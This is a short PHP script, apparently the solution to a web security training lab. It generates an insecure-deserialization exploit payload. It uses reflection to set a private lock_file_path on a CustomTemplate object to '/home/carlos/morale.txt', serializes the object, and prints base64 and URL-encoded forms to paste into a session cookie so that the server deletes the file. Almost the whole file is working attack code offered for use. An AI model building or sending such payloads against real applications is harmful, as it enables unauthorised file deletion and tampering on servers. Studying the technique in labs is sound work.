<?php
class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;
}

// Create object and set the target file to delete
$object = new CustomTemplate();

// We need to use reflection to set private properties
$reflection = new ReflectionClass('CustomTemplate');

$lock_file_property = $reflection->getProperty('lock_file_path');
$lock_file_property->setAccessible(true);
$lock_file_property->setValue($object, '/home/carlos/morale.txt');

$template_file_property = $reflection->getProperty('template_file_path');
$template_file_property->setAccessible(true);
$template_file_property->setValue($object, 'anything');

// Serialize the object
$serialized = serialize($object);

echo "=== EXPLOIT PAYLOAD ===\n\n";
echo "Serialized string:\n";
echo $serialized . "\n\n";

echo "Base64 encoded (use this in cookie):\n";
echo base64_encode($serialized) . "\n\n";

echo "URL encoded (ready to paste in browser):\n";
echo urlencode(base64_encode($serialized)) . "\n";
?>
